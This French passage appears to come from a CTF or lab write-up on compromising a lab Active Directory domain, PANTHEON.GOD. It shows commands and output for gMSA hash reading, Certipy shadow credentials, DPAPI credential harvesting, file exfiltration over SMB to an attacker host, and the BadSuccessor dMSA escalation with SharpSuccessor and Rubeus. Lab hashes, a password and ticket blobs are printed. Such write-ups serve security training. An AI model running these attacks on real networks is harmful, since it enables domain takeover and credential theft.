<p>A l’intérieur un fichier <code>shell.ps1</code> vide sur le quel on à un contrôle totale et qui semble être executer par une tâche planifier</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>*Evil-WinRM* PS C:\coliseum&gt; ls
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    Directory: C:\coliseum
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>Mode                 LastWriteTime         Length Name
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>----                 -------------         ------ ----
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>-a----         6/21/2025   7:38 PM              0 shell.ps1
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>*Evil-WinRM* PS C:\coliseum&gt;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a> $path = &quot;C:\coliseum\shell.ps1&quot;
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>(Get-Acl -Path $path).Access
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>FileSystemRights  : FullControl
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>AccessControlType : Allow
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>IdentityReference : PANTHEON\cronos
<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>IsInherited       : True
<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>InheritanceFlags  : None
<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>PropagationFlags  : None
</code></pre></div>
</li>
</ul>
<p>……………..</p>
<p>Une fois connecter en tant que athena, on peux upload <code>GMSAPasswordReader.exe</code> pour obtenir le hash du compte <code>svc_thunderB$</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt; cd &quot;C:/coliseum/&quot;
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>*Evil-WinRM* PS C:\coliseum&gt; upload /workspace/writeup/GMSAPasswordReader.exe
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>Info: Uploading /workspace/writeup/GMSAPasswordReader.exe to C:\coliseum\GMSAPasswordReader.exe
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>Data: 139944 bytes of 139944 bytes copied
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>Info: Upload successful!
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>*Evil-WinRM* PS C:\coliseum&gt;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>PS C:\coliseum&gt; .\GMSAPasswordReader.exe --AccountName &#39;svc_thunderB$&#39;
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Calculating hashes for Current Value
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>[*] Input username             : svc_thunderB$
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>[*] Input domain               : PANTHEON.GOD
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>[*] Salt                       : PANTHEON.GODsvc_thunderB$
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>[*]       rc4_hmac             : 64BD4596337D081643C878A6CD976307
<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>[*]       aes128_cts_hmac_sha1 : 2982C32362FBCC3C8327BE65974A93CF
<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>[*]       aes256_cts_hmac_sha1 : 7E38C98D4BCAAC2D749C4E3111A3B9222FBF174D6B410B5210282AB9D884324C
<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>[*]       des_cbc_md5          : C1168CC4E04A7A89
<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>
<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>PS C:\coliseum&gt;
</code></pre></div>
<p>On voit avec bloodhound que l’on à un génericWrite sur tout les Dieux à l’exeption de <code>Zeus</code> l’Administrateur du domain. Le dieux avec les droit les plus intérrésant semble être hades qui à un genericAll sur l’OU ENFERS et les enfant de cette dernière.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>[svc_thunderBpantheon.god][Jun 24, 2025 - 04:05:14 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -hashes &quot;:$NT_HASH&quot; -account &quot;$TargetUser&quot;
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>[*] Targeting user &#39;hades&#39;
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>[*] Generating certificate
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>[*] Certificate generated
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>[*] Generating Key Credential
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>[*] Key Credential generated with DeviceID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39;
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>[*] Adding Key Credential with device ID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39; to the Key Credentials for &#39;hades&#39;
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>[*] Successfully added Key Credential with device ID &#39;6f54e71b-36b6-d118-f042-2279e54006d6&#39; to the Key Credentials for &#39;hades&#39;
<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>[*] Authenticating as &#39;hades&#39; with the certificate
<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>[*] Using principal: hades@pantheon.god
<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>[*] Trying to get TGT...
<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>[*] Got TGT
<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>[*] Saved credential cache to &#39;hades.ccache&#39;
<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>[*] Trying to retrieve NT hash for &#39;hades&#39;
<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>[*] Restoring the old Key Credentials for &#39;hades&#39;
<a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a>[*] Successfully restored the old Key Credentials for &#39;hades&#39;
<a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a>[*] NT hash for &#39;hades&#39;: ead49bdbe3311143eeafbcb14d8ae126
</code></pre></div>
<ul>
<li>
<p>Avec <code>WinPEAS</code>, on trouve qu’il y a des credentials dans la <code>dpapi</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>cmdkey<span class="w"> </span>/add:pantheon.god<span class="w"> </span>/user:hera<span class="w"> </span>/pass:<span class="s2">&quot;Qu33n0fG0ds!2024&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>ls<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Credentials&quot;</span><span class="w"> </span>-Fo
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>ls<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Protect&quot;</span><span class="w"> </span>-Fo
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>ls<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\h</span>ades<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials<span class="se">\ </span>-Fo
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>ls<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\h</span>ades<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\ </span>-Fo<span class="w"> </span>-Re
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Protect\*&quot;</span><span class="w"> </span>-Fo
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$env</span><span class="s2">:APPDATA\Microsoft\Credentials&quot;</span><span class="w"> </span>-Fo
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Credentials\*&quot;</span><span class="w"> </span>-Fo
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>Remove-Item<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Protect\*&quot;</span><span class="w"> </span>-Fo<span class="w"> </span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1">#server</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>share<span class="w"> </span>.
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c1">#Client</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>copy<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Credentials\B220D0D6995B10FC4B5718D982AB1B0A&quot;</span><span class="w"> </span><span class="se">\\</span><span class="m">192</span>.168.56.1<span class="se">\\</span>share<span class="se">\\</span>credential
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>copy<span class="w"> </span><span class="s2">&quot;C:\Users\hades\AppData\Roaming\Microsoft\Protect\S-1-5-21-20107180-75155701-1075408035-1133\e2fb222d-1757-4b92-9fd7-094e19c608f7&quot;</span><span class="w"> </span><span class="se">\\</span><span class="m">192</span>.168.56.1<span class="se">\\</span>share<span class="se">\\</span>masterkey
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>dpapi.py<span class="w"> </span>credential<span class="w"> </span>-file<span class="w"> </span>credentials<span class="w"> </span>-key<span class="w"> </span>masterkey
</code></pre></div>
</li>
</ul>
<p>Avec un genericALL sur une OU il y a un <code>Windows Server 2025</code> une vulnérabilité récente au moment ou j’écris ce writeup du nom de <code>BadSuccessor</code> peut être exploiter. </p>
<p>Pour des raison que j’ignore elle ne peux pas êter exploiter directement sur le <code>DC</code>, mais on peux l’exploiter sur une machine jointe au domaine, ce qui tombe bien car dans notre environnement il y a une autre machine <code>pantheon-enfers.pantheon.god</code> à la quel <code>hades</code> peut ce connecter à distance.</p>
<p>Le problème c’est qu’il va nous falloir une session <code>RDP</code> pour effectuer cette exploit. Mais nous n’avons pas le mdp de hades. 
Le hash pourrait être utiliser pour ce connecter en RDP si il été administrateur local de la machine, ce qui n’est pas le cas. 
Cependant ce dernier à un généricALL sur tout les objet de l’OU <code>ENFERS</code> dont <code>orphee</code> qui peut rdp sur la machine <code>pantheon-enfers.pantheon.god</code>.</p>
<p>On donne donc un genericALL sur une <code>OU</code> à orphee pour qu’il puisse exploiter <code>badsuccessor</code> à la place de hades.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>hades@pantheon.god<span class="o">][</span>Jun<span class="w"> </span><span class="m">26</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">02</span>:38:28<span class="w"> </span><span class="o">(</span>CEST<span class="o">)]</span><span class="w"> </span>exegol-pantheon_wu<span class="w"> </span>bloodhound<span class="w"> </span><span class="c1"># stobject &quot;OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD&quot;</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>TargetObject<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;OU=ENFERS,DC=PANTHEON,DC=GOD&#39;</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="o">[</span>hades@pantheon.god<span class="o">][</span>Jun<span class="w"> </span><span class="m">26</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">02</span>:39:13<span class="w"> </span><span class="o">(</span>CEST<span class="o">)]</span><span class="w"> </span>exegol-pantheon_wu<span class="w"> </span>bloodhound<span class="w"> </span><span class="c1"># stcontrolledprincipal orphee</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>ControlledPrincipal<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;orphee&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DC_IP</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;:</span><span class="nv">$NT_HASH</span><span class="s2">&quot;</span><span class="w"> </span>add<span class="w"> </span>genericAll<span class="w"> </span><span class="nv">$TargetObject</span><span class="w"> </span><span class="nv">$ControlledPrincipal</span>
</code></pre></div>
<p>Il va nous falloire compiler le binaire <code>SharpSuccessor.exe</code> et <code>Rubeus.exe</code> dans sa version 2.3.3 minimum : </p>
<p><a href="https://github.com/logangoins/SharpSuccessor">https://github.com/logangoins/SharpSuccessor</a></p>
<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>*Evil-WinRM* PS C:\Users\hades\Documents&gt; upload /workspace/writeup/exploit/SharpSuccessor.exe
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>*Evil-WinRM* PS C:\Users\hades\Documents&gt; upload /workspace/writeup/exploit/Rubeus.exe
</code></pre></div>
<p>Premièrement on va crée un un dMSA sur l’OU ENFERS sur la quel nous avons un droit <code>createChild</code>avec <code>SharpSuccessor.exe</code> </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>PS C:\Users\hades\Desktop&gt; .\SharpSuccessor.exe add /impersonate:Administrator /path:&quot;OU=ENFERS,DC=PANTHEON,DC=GOD&quot; /account:orphee /name:pwned_dMSA
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>   _____ _                      _____
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>  / ____| |                    / ____|
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a> | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>  \___ \| &#39;_ \ / _` | &#39;__| &#39;_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| &#39;__|
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a> |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>                         | |
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>                         |_|
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>@_logangoins
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>[+] Adding dnshostname pwned_dMSA.pantheon.god
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>[+] Adding samaccountname pwned_dMSA$
<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>[+] Administrator&#39;s DN identified
<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>[+] Attempting to write msDS-ManagedAccountPrecededByLink
<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>[+] Wrote attribute successfully
<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>[+] Attempting to write msDS-DelegatedMSAState attribute
<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>[+] Attempting to set access rights on the dMSA object
<a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>[+] Attempting to write msDS-SupportedEncryptionTypes attribute
<a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>[+] Attempting to write userAccountControl attribute
<a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>[+] Created dMSA object &#39;CN=pwned_dMSA&#39; in &#39;OU=ENFERS,DC=PANTHEON,DC=GOD&#39;
<a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>[+] Successfully weaponized dMSA object
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>PS C:\Users\hades\Desktop&gt; .\Rubeus.exe tgtdeleg /nowrap
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>   ______        _
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>  (_____ \      | |
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>   _____) )_   _| |__  _____ _   _  ___
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>  |_|   |_|____/|____/|_____)____/(___/
<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>
<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>  v2.3.3
<a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>
<a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>[*] Action: Request Fake Delegation TGT (current user)
<a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
<a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>[*] No target SPN specified, attempting to build &#39;cifs/dc.domain.com&#39;
<a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>[*] Initializing Kerberos GSS-API w/ fake delegation for target &#39;cifs/pantheon-dc01.pantheon.god&#39;
<a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>[+] Kerberos GSS-API initialization success!
<a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
<a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>[*] Found the AP-REQ delegation ticket in the GSS-API output.
<a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>[*] Authenticator etype: aes256_cts_hmac_sha1
<a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>[*] Extracted the service ticket session key from the ticket cache: HMqUhWU8WupaHB+glfk5VQUV9llzHa876Aa0XuGFLPo=
<a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>[+] Successfully decrypted the authenticator
<a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a>[*] base64(ticket.kirbi):
<a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a>
<a id="__codelineno-36-24" name="__codelineno-36-24" href="#__codelineno-36-24"></a>      doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDFBBTlRIRU9OLkdPRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFOVEhFT04uR09Eo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaY/IXr0VvYXbwRSdf+G7rmOdF6WwntJQoDum/IbgJIZlsnJuObYMvrTZ0DukrhXP6pp4dbIoiidATPFAzwsy9pYbmtUHnvCm3xabKjxeRbQq9Xo9tKOX2qhqJvcElWSCkVDA0KBNY/bs4WCmF1ACKUoDYIHszQfCUUY7JVTpLmO7olQfNnpyv4NA/tOpfMmo4lXCJufIy81c76OtKpk2g46lhJbcWVZaE6y/21C9bahCQLC3Om/5i36lQS5mlE5P61zXy2K2EjOA+Q9mcvfTumgWApaQrDPP2z5dYmhcB5TMJN+5IZgxL/xLu3BS367V+0AKGhz9SREUhpWO7BSyvGb/ZlgE3hRcc3R14YDVOWJeDqhVr6/D+6C4+NaFCWsN4VKN8aLLFwSCU97Vkdvclqs08f4iZ54CR6I59UW82iPa1O5K4bX+O9kGd60t/h1+mHnmKt4MN8ORlLlqDzDen1IAdn4RS1/IHg0FySO1OtqGxY653iesKbbfIUkAiapfGKlapDD03JbduODmZCsCoJ9aS31n1+Qob3CgEO3rOjyKp2uHsaYV7jrxbeIkiyXB3AH/kLvGNhkNfZCj2MEWqoS7R+BIV7KTPUD25NH3pb/GKZzHY4ua22J2ipF/Wl6CGVb2JTzw8Te2/Jf6geVnBsQpV+JkPYC32xZEr+za2o2u0QytniaxSZXqVykhZjCXMPmi4RA20Jar22PRVa6YTKkv1yt2/DAepugQEEHC+/StwMANmXHF7YbzlQSMeUQCmYV2wv+/fmFHp2n59F9evY8DAXWid8QUG9wGEAURvDbAsT7D0EcBYBqXL2Kj2LoKplVeif7Yc/WIPyiXE8EHl75MFB+isIdTUcZkLrETlh6sUR1ei7HvS4Q4KPjN9viFS5IutxMwWmiYwNbtTkPaPZ7B4o+GuX5p5oMYzYeI/eQ/vQ7LERSv3QHsr0L2kqBS4HPU+kdRxLy6c/VDjtESdDAb7vQjfdpgyBoAyZFfHmBK6bIk0H4uucI273xyVZFbZ0zWy0EHzrm5kIyaQL2ECLmHr8n2gwpMQ7trN4sbf0IeAV8WM20+pQ3D5Arc1CceH+IL1fIoUbErRbbnTSNI4qb620y7GiJ9MzVL+z04prviulKeKGEDWzu7I3h7/Gi7oygDsQmrMlUvXLrT0nVyuMMLP1WZBJI1JBXlDkziQckwuoArGy1ZvhyHUb0fyplTW05Rl1YBdcegbn/eLgD/xt558H1KDdvhkoscVlKEvNKTFjbcJkiESJrIreUP5vaElcg1FV6JCuFXZCgF+p1GZS/n7YGSwOJ9f+PPeYrr4DejNIPmfzdXlx34JfsXzQUaBOEotfUQnUU9eRkzSZtp09/SZvs5HTTKBrVc8ySrWfccpHKsqYknIiAiepCY2ZpjzgUjSBLLOl1Brii8D4uH6MJBkQrAUso4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgFLSEDL2+vdNw2peo8khxhS1IS+pJa2UBSm2WMU3CzyChDhsMUEFOVEhFT04uR09EohIwEKADAgEBoQkwBxsFaGFkZXOjBwMFAGChAAClERgPMjAyNTA2MjExMTU3MjNaphEYDzIwMjUwNjIxMjE1NjM3WqcRGA8yMDI1MDYyODExNTYzN1qoDhsMUEFOVEhFT04uR09EqSEwH6ADAgECoRgwFhsGa3JidGd0GwxQQU5USEVPTi5HT0Q=
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>PS C:\Users\hades\Desktop&gt; .\Rubeus.exe asktgs /targetuser:pwned_dMSA$ /service:krbtgt/pantheon.god /opsec /dmsa /nowrap /ptt /ticket:doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDFBBTlRIRU9OLkdPRKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFOVEhFT04uR09Eo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDY0lRuxN5TRUtZZ5p1HdpRVdHLfSSQMtI1oYS2Dk1zJjFJirGGJAHokqeRc0dQrevSqBiNQFZ5ZF6K6fEc/WLKpUPp6g+iZHjMNkoFdVLi3llL8bsmNLIv3xEiGWv7vBWXFDBrpWx6fP2XCaPnEjZAqrZTg/kdjtOnOwqVWx0jFERU5n/+d7U2iwq1B2gPpGzMIBeD0TiYk0pnXvBQhQ/I3VlmZKQQ2+ko5DyTwEmvJ9b9Il+2Y7MvpblzS7ZOKzGuNpDvAl6+L80e7dNjz+GCkxtgN71/gxfDEgQXW3E9JXmXiE5W0cZjbEcmPQd0lMag1Jjui2uRmpABVh9wHq35QuN5bWDjseFBLPHGc0/H9SQ1DQdWk83H/UsUdQ0BRqdOLXAig1uwVDTr0eNP7trmRU+OM8hYl2n6/eqnsb0GQ6OyuixBq9nPQu8xC7a5lg3OgICSpsuyzIh0EBWVvNRYgSz2kFwQgKrS6SyrOQgzTXjC/iN1qZn3FGHF2xCFunffmcT3NLXaVnLAEic4RjhBR5GPAhRx4fcAF12ywNoOBX0e9ZfzEKgyz8vOuXa86LQeZpjWiRH6XPgy6d4rISvUtaqysDxFXrT0SKjleahtwu9jjLPOtQyhKMRRjEPaP3CfCs9o4qE6zxPi84iM3CXMYRpFKxDZLSytKFbMDs57h+FELwVlldnDAx28R0iRPr7cEB9amSo7E153tNIuTCc9Pi+zLlzp5gKEmIfn3lPX85XlZgP6Xcb+MrUszzZjQSftTOR6iKhtBqmjqcg5PqfeHNf37ozTrC2y4QEmgdk6bbtfPFFrgPVsDBox3KxQ9RyehC7flS1lmMGqXkiuVlW7hf5MmK8nOd+NT3Fc3Ru0BOk11HP/4Ey6MS4YYl+DiijwzpnsV7wsexV4ZeUMpUZsQML20Oz4zGJdFYZbDvNex7UNXTF67GEBKUZ6DCaI5u1wu4rpnio980qWHGGvZpffAgMMN0/75OrxRx7A3ex0JziJGKl7mYx4G9cE4TqPULBucWRbFXrlye66ErJynU32q+OkUZT8T73RCbOQiP0fF2sJn8jibDQNBpjpWsihZ6/dpiGE5VDvM8z/bfWIzW9fdngXZdy4AKZBWrkGqAbDZ4m3QynqeQN17Hddr8IduuRZtLY14EVkAQb/as7RtGPVsezAkWFulYdEWN+nvdg/lcAXI0H1oD1tqjnKggsPn7fmviRON3mhoc06/6e014ZQqC0v2UsyX8THF39b5XPbKsMxpH0nB02ylkpoCXpMBaNvS5qgZz8s9PkZpO6zOCU6jXZFTy/cP7rYdSvJCwP+aunMNCMikUVv3yplqvDwNVeSVG